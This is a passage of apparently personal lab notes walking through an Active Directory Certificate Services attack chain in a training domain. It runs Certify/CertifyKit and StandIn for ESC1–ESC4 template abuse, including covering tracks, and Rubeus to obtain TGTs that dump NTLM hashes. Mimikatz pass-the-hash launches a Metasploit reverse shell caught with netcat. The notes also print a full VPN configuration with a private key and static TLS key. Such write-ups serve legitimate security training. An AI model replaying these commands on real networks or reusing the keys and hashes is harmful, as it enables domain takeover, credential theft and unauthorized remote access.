PS C:\Windows\Tasks> .\CertifyKit.exe request /ca:cb-ca.cb.corp\cb-ca /machine /template:Machine
.\CertifyKit.exe request /ca:cb-ca.cb.corp\cb-ca /machine /template:Machine
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/

[*] Action: Request a Certificates
[*] Elevating to SYSTEM context for machine cert request

[*] Current user context    : NT AUTHORITY\SYSTEM
[*] No subject name specified, using current machine as subject

[*] Template                : Machine
[*] Subject                 : CN=cb-store.certbulk.cb.corp

[*] Certificate Authority   : cb-ca.cb.corp\cb-ca

<snip>
```

-> [[PERSIST1]]
- First we need to impersonate `cb\certstore`. Since we have the account's plain text password, we can simply use **runas**.
```powershell
PS C:\ADCS\Auditor\Loot> runas.exe /user:cb\certstore powershell.exe
Enter the password for cb\certstore:
Attempting to start powershell.exe as user "cb\certstore" ...
```

```powershell
PS C:\ADCS\Auditor\Loot> ..\CertifyKit.exe request /ca:cb-ca.cb.corp\cb-ca /template:User
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/

[*] Action: Request a Certificates

[*] Current user context    : CB\certstore
[*] No subject name specified, using current context as subject.

[*] Template                : User
[*] Subject                 : CN=certstore, CN=Users, DC=cb, DC=corp

[*] Certificate Authority   : cb-ca.cb.corp\cb-ca

<snip>
```

### Enumerating access rights of `certbulk\cb-store` ###
- We can not find anything interesting related to the permissions that the `certbulk\cb-store$` account grants us.

### Enumerating access rights of `cb\certstore` ###
- From [[1. Enumeration]] we can see that `cb\certstore` has some interesting permissions over specific certificate templates:
	- The account has **Enrollment Rights** over the **StoreDataRecovery-Agent** and **StoreDataRecovery** templates. This essentially opens up capabilities to escalate our privileges through [[ESC3]].
	- The account has `WriteOwner`, `WriteDACL` and `WriteProperty` permissions over the **SecureUpdate** template, which opens up capabilities to escalate our privileges through [[ESC4]].

### Domain/Enterprise Privilege Escalation abusing ADCS as `cb\administrator` ###
#### [[ESC3]] ####
- First we will request an enrollment agent certificate.
```powershell
PS C:\ADCS\Auditor> .\Certify.exe request /ca:cb-ca.cb.corp\CB-CA /template:StoreDataRecovery-Agent

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : CERTBULK\student33
[*] No subject name specified, using current context as subject.

[*] Template                : StoreDataRecovery-Agent
[*] Subject                 : CN=student33, CN=Users, DC=certbulk, DC=cb, DC=corp

[*] Certificate Authority   : cb-ca.cb.corp\CB-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 64

<snip>
```

- We shall convert the generated certificate to a `.pfx` format and we will use it to issue a certificate request on behalf of the EA to a template that allow for domain authentication.
- Here we do not need to bypass the CBA patch in this case as we aren’t abusing `SubjectAlternativeName`.
```powershell
PS C:\ADCS\Auditor> ./Certify.exe request /ca:cb-ca.cb.corp\CB-CA /template:StoreDataRecovery /onbehalfof:cb\administrator /enrollcert:C:\ADCS\Auditor\Loot\StoreDataRecovery-Agent.pfx

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : CERTBULK\student33

[*] Template                : StoreDataRecovery
[*] On Behalf Of            : cb\administrator

[*] Certificate Authority   : cb-ca.cb.corp\CB-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 65

<snip>
```

#### [[ESC4]] ####
- Initially we will enable the `ENROLLEE_SUPPLIES_SUBJECT SAN` flag.
```powershell
PS C:\ADCS\Auditor> .\StandIn_v13_Net45.exe --ADCS --filter SecureUpdate --ess --add

[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=cb,DC=corp

[>] Publishing CA          : CB-CA
    |_ Template            : SecureUpdate
    |_ Enroll Flags        : INCLUDE_SYMMETRIC_ALGORITHMS, AUTO_ENROLLMENT
    |_ Name Flags          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    |_ pKIExtendedKeyUsage : Windows Update
    |                        Client Authentication
    |_ Created             : 4/19/2023 1:06:48 PM
    |_ Modified            : 9/18/2023 2:47:29 PM

[+] Adding msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT
    |_ Success
```

- After that, we will modify the enrollment permissions to include `cb\certstore`.
```powershell
PS C:\ADCS\Auditor> .\StandIn_v13_Net45.exe --ADCS --filter SecureUpdate --ntaccount cb\certstore --enroll --add

[+] Search Base  : LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=cb,DC=corp

[>] Publishing CA          : CB-CA
    |_ Template            : SecureUpdate
    |_ Enroll Flags        : INCLUDE_SYMMETRIC_ALGORITHMS, AUTO_ENROLLMENT
    |_ Name Flags          : ENROLLEE_SUPPLIES_SUBJECT, SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    |_ pKIExtendedKeyUsage : Windows Update
    |                        Client Authentication
    |_ Created             : 4/19/2023 1:06:48 PM
    |_ Modified            : 9/18/2023 2:52:46 PM

[+] Set object access rules

[+] Adding Certificate-Enrollment permission : cb\certstore
    |_ Success
```

- Finally, we will alter the vulnerable template to enable the `SmartCardLogon` EKU and request a certificate as `cb\administrator`. In the end, the template will be automatically restored to it's previous condition to cover our tracks.
- Here we do need to bypass the CBA patch, since in this case as we are abusing `SubjectAlternativeName`.
```powershell
PS C:\ADCS\Auditor> .\CertifyKit.exe request /ca:cb-ca.cb.corp\CB-CA /template:'SecureUpdate' /altname:administrator /domain:cb.corp /alter /sidextension:S-1-5-21-2928296033-1822922359-262865665-500
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/

[*] Action: Request a Certificates

[*] Certificate template 'SecureUpdate' updated!

[*] Current user context    : CERTBULK\student33
[*] No subject name specified, using current context as subject.

[*] Template                : SecureUpdate
[*] Subject                 : CN=student33, CN=Users, DC=certbulk, DC=cb, DC=corp
[*] AltName                 : administrator
[*] SidExtension            : S-1-5-21-2928296033-1822922359-262865665-500

[*] Certificate Authority   : cb-ca.cb.corp\CB-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 67

<snip>
```

#### Using the generated certificate (either from ESC3 or ESC4) to impersonate `cb\administrator`. ####
- We can now use the generated certificate to impersonate the EA.
- We could also abuse this misconfiguration to escalate our privileges to DA on `certbulk.cb.corp` by impersonating `certbulk\administrator`.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe asktgt /user:Administrator /certificate:C:\ADCS\Auditor\Loot\ea.pfx /domain:cb.corp /dc:cb-ca.cb.corp /nowrap /ptt /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator, CN=Users, DC=cb, DC=corp
[*] Building AS-REQ (w/ PKINIT preauth) for: 'cb.corp\Administrator'
[*] Using domain controller: 172.16.10.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

<snip>

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 78D1E8DAE675DC26164E3D2B0E6AD0C3
```

-> We have discovered our first path to EA. We can document it in [[3. Attack Paths]] to keep track of our findings.

## `protectedcb.corp` ##

- Earlier we discovered some "artifacts" hinting us towards the existence of a new, previously unreachable domain.
- More specifically, we discovered an account certificate belonging to `protecteduser` and a VPN file as well as a certificate and a private key, all in separate files.
- We can try to combine the 3 later files to create a fully functional VPN configuration file. We will fill the missing CERTIFICATE and PRIVATE KEY sections with the contents of the 2 files.
```powershell
#-- Config Auto Generated By pfSense for Viscosity --#

#viscosity startonopen false
#viscosity dhcp true
#viscosity dnssupport true
#viscosity name protectedcb
dev tun
persist-tun
persist-key
data-ciphers AES-256-GCM:AES-128-GCM:CHACHA20-POLY1305:AES-256-CBC
data-ciphers-fallback AES-256-CBC
auth SHA256
tls-client
client
resolv-retry infinite
remote 172.16.100.254 447 tcp4
nobind
verify-x509-name "protectedcb" name
remote-cert-tls server

<ca>
-----BEGIN CERTIFICATE-----
MIIEEDCCAvigAwIBAgIILREpGRxIa9cwDQYJKoZIhvcNAQELBQAwXjEUMBIGA1UE
AxMLcHJvdGVjdGVkY2IxCzAJBgNVBAYTAlVTMRYwFAYDVQQIEw1TYW4gRnJhbmNp
c2NvMQswCQYDVQQHEwJDQTEUMBIGA1UEChMLSVQgU2VjdXJpdHkwIBcNMjMwNDA0
MTAwNTQyWhgPMjEyMzAzMTExMDA1NDJaMF4xFDASBgNVBAMTC3Byb3RlY3RlZGNi
MQswCQYDVQQGEwJVUzEWMBQGA1UECBMNU2FuIEZyYW5jaXNjbzELMAkGA1UEBxMC
Q0ExFDASBgNVBAoTC0lUIFNlY3VyaXR5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
MIIBCgKCAQEAsUwa2iw48VzrUo7TRDflrJ8+ErQ6Nc8Kh6qrSLPkN3nnfqEwDH0K
oB4ROHKQ8bXbe8J3bBjjD7jDIWmHHKk0tYmP8OBJN5BrWiaf5wzpSs05aY4v9Llr
2dX2/UbqoJsY7FfM20wR0EHjEFdart/fEpy/FivqGd2wgq88buynH2uZNKbPF28f
//ve5zrCLqiZb0At+DT4FqxKQuUELoP+Ui+c5QfRzEmzMfHpv+6hGujdj3lDaLD+
aZLnpnhdFHjk7o14PrIMKLOPB7iSAyMAOJqi13akjQn6ikvL8TnZsfTp2OcipvLW
nf98k+ykf+tbOdQAlSNGymLqjcl6pWBKOwIDAQABo4HPMIHMMB0GA1UdDgQWBBTs
xp5/y5pFP2AaCDGNlDKnS7GFuDCBjwYDVR0jBIGHMIGEgBTsxp5/y5pFP2AaCDGN
lDKnS7GFuKFipGAwXjEUMBIGA1UEAxMLcHJvdGVjdGVkY2IxCzAJBgNVBAYTAlVT
MRYwFAYDVQQIEw1TYW4gRnJhbmNpc2NvMQswCQYDVQQHEwJDQTEUMBIGA1UEChML
SVQgU2VjdXJpdHmCCC0RKRkcSGvXMAwGA1UdEwQFMAMBAf8wCwYDVR0PBAQDAgEG
MA0GCSqGSIb3DQEBCwUAA4IBAQBPtiJDvyajT6cgwBOE1Js+UDaMjn1Zb6M/gcLB
FSfU0RfaF4X6+rXmBfUXAQaYGQTxDCCt62GHglrVDw6NqUqyz+n39Y0st5TKSVwP
OS2vTdiHfFKankq9vDs2KqPgOiNzxrWpgNl/gYzbfxXegcKrJeiAMfhIe6LkJhh0
1bFiqx7Vl90nBIcEJjG29wM3cprT3xIR3UeCNs1n5ULQTNi9nwzE/Xc6EWs0Mjae
ZbdN7oDKvSqg0a7/BURjDKmsT8QAlrqnhaESvuamCAlrRDLRXwBemQPO0wveemT5
L112oYG1DW3XLXHLZgGqc8Jv9r4RLBAAVGvmqFHNUOrthcCM
-----END CERTIFICATE-----
</ca>
<cert>
-----BEGIN CERTIFICATE-----
MIIEZjCCA06gAwIBAgIBAjANBgkqhkiG9w0BAQsFADBeMRQwEgYDVQQDEwtwcm90
ZWN0ZWRjYjELMAkGA1UEBhMCVVMxFjAUBgNVBAgTDVNhbiBGcmFuY2lzY28xCzAJ
BgNVBAcTAkNBMRQwEgYDVQQKEwtJVCBTZWN1cml0eTAeFw0yMzA0MDQxMDE2MjFa
Fw0zMzA0MDExMDE2MjFaMF4xCzAJBgNVBAYTAlVTMRYwFAYDVQQIEw1TYW4gRnJh
bmNpc2NvMQswCQYDVQQHEwJDQTEUMBIGA1UEChMLSVQgU2VjdXJpdHkxFDASBgNV
BAMTC3Byb3RlY3RlZGNiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
uNq8J5CFRYRC8X01uL3CB8TY4zemtOCSAG0qdlyjMb0rzyO6iJbqfWcQ5Ipkst36
ZK/toS5FEpIQvfuZ9O05aLmaEHewvg3xti/qWfzSGG+mlyel8FzSkViFZcPQ7Q/G
qmz0+SPf0/at58/3tc/2Knc1N8AoPrygxY4a6vWlreE/MgwJ0dcKH923A5kBCXhJ
8IY9htdJKH3W7MDXz6AjEGc9sVXaIbXgQ8rQuFsS7BDJfa3408WZ3p5OfRQUeoTy
Z4cTMSvLTy2ixboCMYRPjiG7Nhi+BRZo+nWa66nyuyIk7h7mubw8Zua6tYFp+O8+
MXIJ1kBdHYy0Yxs5NhNbswIDAQABo4IBLTCCASkwCQYDVR0TBAIwADALBgNVHQ8E
BAMCBeAwMQYJYIZIAYb4QgENBCQWIk9wZW5TU0wgR2VuZXJhdGVkIFVzZXIgQ2Vy
dGlmaWNhdGUwHQYDVR0OBBYEFOVqqmVFz6KebFxpOvyPeKro+80XMIGPBgNVHSME
gYcwgYSAFOzGnn/LmkU/YBoIMY2UMqdLsYW4oWKkYDBeMRQwEgYDVQQDEwtwcm90
ZWN0ZWRjYjELMAkGA1UEBhMCVVMxFjAUBgNVBAgTDVNhbiBGcmFuY2lzY28xCzAJ
BgNVBAcTAkNBMRQwEgYDVQQKEwtJVCBTZWN1cml0eYIILREpGRxIa9cwEwYDVR0l
BAwwCgYIKwYBBQUHAwIwFgYDVR0RBA8wDYILcHJvdGVjdGVkY2IwDQYJKoZIhvcN
AQELBQADggEBABW+yi7C6xdRKazGO9+8KSPTQCncQ2v3JydzopwYkk0n+2lF6CCG
7e7QYTf7AWCGglRNlNeJ/0JOy5N6gubLogS0J6giKTe/bDBKmc9Bo9Kb1iXOwcuU
HtEzrDGHUlU059Y6AxZRX4JnmGvDed4EH6+NO7bdZkGplzrKN85a5y/L4qrzACVC
RgihNerzA1ueGOREjK1GhK+/z87GAnSXd7rrTlHSC+L5nn2UoOtUaN92udQ0w6LF
0yvJ0YeeZtlyifjPFXW4o6yCprRYB07jMKKjhBIvVc8GaLLeJjZYOEIW2dMLXMIk
exv9iV4fPXsvVq4KPe4DurPC3utJ26/u9io=
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC42rwnkIVFhELx
fTW4vcIHxNjjN6a04JIAbSp2XKMxvSvPI7qIlup9ZxDkimSy3fpkr+2hLkUSkhC9
+5n07TlouZoQd7C+DfG2L+pZ/NIYb6aXJ6XwXNKRWIVlw9DtD8aqbPT5I9/T9q3n
z/e1z/YqdzU3wCg+vKDFjhrq9aWt4T8yDAnR1wof3bcDmQEJeEnwhj2G10kofdbs
wNfPoCMQZz2xVdohteBDytC4WxLsEMl9rfjTxZnenk59FBR6hPJnhxMxK8tPLaLF
ugIxhE+OIbs2GL4FFmj6dZrrqfK7IiTuHua5vDxm5rq1gWn47z4xcgnWQF0djLRj
Gzk2E1uzAgMBAAECggEBAIQtO26a4wCTEv7zxc8EOFIvydmmeFhLX3pYlI0vri0p
k8K4TG/QYXkrkiOoZVqUaK9IMIUYvaEKulfuKOa+HVeppuTxgHpVJCleV5bitSNt
6lOYsQmOha4R+siKXMC1kBtab0wZ/7jjYPQpe3kQa3dv56imiOBbJiY8dzjcTwxl
k0on9UeXqJCCXqkMmnLKW2jQg18TwpTQIJaHuSdNnylZh8beIm+y9Bjx3L+P4qLd
7L0sirEaSaqPTUCu2QcX9VBWDk28/UkLefuUtQUHoJNbWbWPqfvbRvpcivNRfYCm
4tt9jxXuJ8SJSW3QBprQJE1x2ZMInpQZ89Q7VQwvsqECgYEA8nE61Vg2KzGNSTAP
nJjNmeNnyD3cgcFohGWCUc5nRSOEr1n7ialMbUruEvNzZXb89L6u83PunZWiKIpg
xkGhQBNLqXjr/pcJg9L/IzjmV9VVT9dPm60rDUfWrPoEbiGlBdO9NWsH5j8FJWX2
PzVSM6I2rlN0URjpYYsaUfSLipECgYEAwzEV0qnGGwRj77NXjQ4a4SgqolLxfmXf
Qjkk3DRqs/bmeOcB5QPGhdNLLqi1COih62DsIXu3qBoFH/oj8rDJA2Rxs06WoiVv
Ob/It2CE5RJG3a7rfN4M1Ke8We5dykuYfl6gzv2Sl+0VPydcbHOhrb2Sx/v0IX6b
ULZSztxq/AMCgYEAouNwo+agfmTMiF/CHXSMrtga4m6tuIA5uLp61HvY5pr2itnq
JpOYxdWSHylyXrmTOtzirq81oqrmSFawroNp06MjMroL1QGlYuxgf0m7eUfcCcif
s/ik9EdP9OgGEfiI52FbvogqxoeQ7Y+T4uPwVsCl/HoVrGcQZnkPNgEXwAECgYBD
An/ucZBsSAaTDOu6piP+Nk7kqTr03L5Xusx3uJsFK3cV/KB+4dvup4pA+3QjGdI0
v3JxUErNsBkgUDy1HZH00y/hkdJO2jEkDz42DjGxfqPLiTiZBpY7D1avPRD/2RIC
GDR2u0DvXVoU80tchBn2ToWsmEfIk/F4NQ+aqrsjxwKBgDw+6eYuwW3Qqz2KyHsa
DTSn2JTHu3fB7iYVEsv2eVZX9E6T0mcgu2kaDLZnqd10xFtw/qZCVENR/olZDBkU
l3RgqjUMRnxvsbmQiXtvDkmuba223XaOEw0SsPzIsJvdGb40P3Y/SyYpWoKKg969
00f0HahRQctfZgWfCy4JK9rJ
-----END PRIVATE KEY-----
</key>
key-direction 1
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
e66dda821087a7f67af6425eb597bb04
9447c58d57312f042fec80622ae9a9df
e04cd8976bf705e10b3d5a2f7a6baa21
ef9efd5260a59469aae95015eee366a8
d7cc46eb786d88f53e9e67e9f42c18e3
f9a05d70914487989e46261914c82c8a
eb9c1d0d28cc1418a3a5b5a9373a7f5d
2904a0bd7a13d266f2d57f4f1a069274
eaad10226dff55fc549f5f5f812f694b
59db31621b46d2c51b23e3c0512d1380
90ef46983f240eca7162421366351f19
886d54a889a363162c08bda7148b3beb
bbfe2e6ebca3a17ffbb0d2a31d482bd0
be57a7f749d97e66203c26ac3a3accaa
7e2263ffe9468bd2d29579153ff5b630
d1a429d2ee5d3c04d91b3ac9bb13ee73
-----END OpenVPN Static key V1-----
</tls-auth>
```

- We will use the full VPN config file to connect to the internal network that hosts `protectedcb.corp`.
```powershell
PS C:\ADCS\Auditor> nslookup protectedcb.corp
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  172.16.67.1

Non-authoritative answer:
Name:    protectedcb.corp
Address:  172.22.87.1
```

- We can now reach the domain controller of `protectedcb.corp`. This essentially allows us to use the pillaged certificate of `protectedcb\protecteduser` to impersonate that user and start enumerating this domain and try to define the attack surface.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe asktgt /user:protecteduser /certificate:C:\ADCS\Auditor\Loot\protecteduser.pfx /domain:protectedcb.corp /nowrap /ptt /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=protecteduser, CN=Users, DC=protectedcb, DC=corp
[*] Building AS-REQ (w/ PKINIT preauth) for: 'protectedcb.corp\protecteduser'
[*] Using domain controller: 172.22.87.1:88

<snip>

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 97D563550D309648ECAE42657767F6A0
```

- We can now use **PowerView** to enumerate this domain. Let's output the results in [[1. Enumeration]].

- Let's see if `protectedcb\protecteduser` has access rights to any computers of the domain.
```powershell
PS C:\ADCS\Auditor> Find-PSRemotingLocalAdminAccess -Domain protectedcb.corp
cbp-ws17
```

- Let's access **CBP-WS17** to harvest credentials/tokens.
- Both **Mimikatz** and **CertifyKit** do not show anything interesting.

- Let's try to see if we can abuse any certificate templates.
- Since **CertifyKit** does not correctly output permissions for the certificate templates, let's find the Object SID of `protectedcb\protecteduser`.
```powershell
PS C:\ADCS\Auditor> Get-DomainUser -Domain protectedcb.corp | Select-Object samaccountname,objectsid

samaccountname objectsid
-------------- ---------
Administrator  S-1-5-21-1286082170-882298176-404569034-500
Guest          S-1-5-21-1286082170-882298176-404569034-501
krbtgt         S-1-5-21-1286082170-882298176-404569034-502
protecteduser  S-1-5-21-1286082170-882298176-404569034-1104
```

- We can see that `protectedcb\protecteduser` has enrollment rights to **ProtectedUserAccess** and **Substitute-ProtectedUserAccess**
- **ProtectedUserAccess** has the `ENROLLEE_SUPPLIES_SUBJECT` flag set, as well as the EKU flag set to `Client Authentication`. This makes it vulnerable to [[ESC1]].
- **ProtectedUserAccess** has the `ENROLLEE_SUPPLIES_SUBJECT` flag set, as well as the EKU flag set to `Any Purpose`. This makes it vulnerable to [[ESC2]].
- Both of these ways present us with opportunities to escalate our privileges on this domain.
- If we try to abuse any of these misconfigurations, we will fail, because of the Kerberos Double Hop problem.
```powershell
PS C:\ADCS\Auditor> .\Certify.exe request /ca:cbp-dc.protectedcb.corp\CBP-CA /domain:protectedcb.corp /template:ProtectedUserAccess /altname:Administrator /sidextension:S-1-5-21-1286082170-882298176-404569034-500

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : CERTBULK\student33
[*] No subject name specified, using current context as subject.

[*] Template                : ProtectedUserAccess
[*] Subject                 : CN=student33, CN=Users, DC=certbulk, DC=cb, DC=corp
[*] AltName                 : Administrator
[*] SidExtension            : S-1-5-21-1286082170-882298176-404569034-500

[!] Unhandled Certify exception:

System.Runtime.InteropServices.COMException (0x80094015): CertEnroll::CX509CertificateRequestPkcs10::InitializeFromPrivateKey: An enrollment policy server cannot be located. 0x80094015 (-2146877419 CERTSRV_E_NO_POLICY_SERVER)
   at CERTENROLLLib.CX509CertificateRequestPkcs10Class.InitializeFromPrivateKey(X509CertificateEnrollmentContext Context, IX509PrivateKey pPrivateKey, String strTemplateName)
   at Certify.Cert.CreateCertRequestMessage(String templateName, Boolean machineContext, String subjectName, String altName, String sidExtension)
   at Certify.Cert.RequestCert(String CA, Boolean machineContext, String templateName, String subject, String altName, String sidExtension, Boolean install)
   at Certify.Commands.Request.Execute(Dictionary`2 arguments)
   at Certify.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)
   at Certify.Program.MainExecute(String commandName, Dictionary`2 parsedArgs)


Certify completed in 00:00:04.8180008
```

- We need to get a reverse shell from the **CBP-WS17** to **CB-WS33** to be able to execute our attacks.
- First, we will create a `.bat` reverse shell that points to our machine using **Metasploit**. We will transfer it to **CBP-WS17** and use **Mimikatz** to execute is as `protectedcb\protecteduser`.
```powershell
PS C:\Windows\Tasks> .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:protecteduser /domain:protectedcb.corp /ntlm:97D563550D309648ECAE42657767F6A0 /run:C:\Windows\Tasks\rev.exe" "exit"
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:protecteduser /domain:protectedcb.corp /ntlm:97D563550D309648ECAE42657767F6A0 /run:C:\Windows\Tasks\rev.exe" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /user:protecteduser /domain:protectedcb.corp /ntlm:97D563550D309648ECAE42657767F6A0 /run:C:\Windows\Tasks\rev.exe
user    : protecteduser
domain  : protectedcb.corp
program : C:\Windows\Tasks\rev.exe
impers. : no
NTLM    : 97d563550d309648ecae42657767f6a0
  |  PID  1528
  |  TID  1624
  |  LSA Process is now R/W
  |  LUID 0 ; 2772372 (00000000:002a4d94)
  \_ msv1_0   - data copy @ 000001F1B6771070 : OK !
  \_ kerberos - data copy @ 000001F1B6283EB8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000001F1B67415D8 (32) -> null

mimikatz(commandline) # exit
Bye!
```

```powershell
PS C:\ADCS\Auditor> .\nc.exe -lvnp 443
listening on [any] 443 ...
connect to [172.16.100.33] from (UNKNOWN) [172.22.87.12] 63826
Windows PowerShell running as user protecteduser on CBP-WS17
Copyright (C) Microsoft Corporation. All rights reserved.

whoami
protectedcb\protecteduser
PS C:\Windows\system32>
```

- Now we will not face the Kerberos Double Hop issue BUT we do need to make sure that we have a valid TGT for `protectedcb\protecteduser` in our reverse shell, since sometimes tickets will now be successfully transferred there.
```powershell
PS C:\Windows\system32> klist

Current LogonId is 0:0xfd12f

Cached Tickets: (0)
```

- We do not have a ticket imported. Let's transfer **Rubeus** and `protecteduser.pfx` to the target server to request a TGT and impersonate that account.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe asktgt /user:protecteduser /certificate:C:\Windows\Tasks\protecteduser.pfx /domain:protectedcb.corp /nowrap /ptt /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=protecteduser, CN=Users, DC=protectedcb, DC=corp
[*] Building AS-REQ (w/ PKINIT preauth) for: 'protectedcb.corp\protecteduser'
[*] Using domain controller: 172.22.87.1:88

<snip>

PS C:\Windows\Tasks> klist

Current LogonId is 0:0xfd12f

Cached Tickets: (1)

#0>     Client: protecteduser @ PROTECTEDCB.CORP
        Server: krbtgt/protectedcb.corp @ PROTECTEDCB.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 9/19/2023 3:14:15 (local)
        End Time:   9/19/2023 13:14:15 (local)
        Renew Time: 9/26/2023 3:14:15 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

- We can now request a certificate for `protectedcb\cbp-ws17$` to maintain persistence in that computer.
```powershell
PS C:\Windows\Tasks> .\CertifyKit.exe request /machine /template:Machine /ca:cbp-dc.protectedcb.corp\cbp-ca
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/

[*] Action: Request a Certificates
[*] Elevating to SYSTEM context for machine cert request

[*] Current user context    : NT AUTHORITY\SYSTEM
[*] No subject name specified, using current machine as subject

[*] Template                : Machine
[*] Subject                 : CN=cbp-ws17.protectedcb.corp

[*] Certificate Authority   : cbp-dc.protectedcb.corp\cbp-ca

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 22

<snip>
```
### [[ESC1]] ###
```powershell
PS C:\Windows\Tasks> .\Certify.exe request /ca:cbp-dc.protectedcb.corp\CBP-CA /domain:protectedcb.corp /template:ProtectedUserAccess /altname:Administrator /sidextension:S-1-5-21-1286082170-882298176-404569034-500

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : PROTECTEDCB\protecteduser
[*] No subject name specified, using current context as subject.

[*] Template                : ProtectedUserAccess
[*] Subject                 : CN=protecteduser, CN=Users, DC=protectedcb, DC=corp
[*] AltName                 : Administrator
[*] SidExtension            : S-1-5-21-1286082170-882298176-404569034-500

[*] Certificate Authority   : cbp-dc.protectedcb.corp\CBP-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 35

<snip>
```

### [[ESC2]] ###
```powershell
PS C:\Windows\Tasks> .\Certify.exe request /ca:cbp-dc.protectedcb.corp\CBP-CA /domain:protectedcb.corp /template:Substitute-ProtectedUserAccess /altname:Administrator /sidextension:S-1-5-21-1286082170-882298176-404569034-500

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : PROTECTEDCB\protecteduser
[*] No subject name specified, using current context as subject.

[*] Template                : Substitute-ProtectedUserAccess
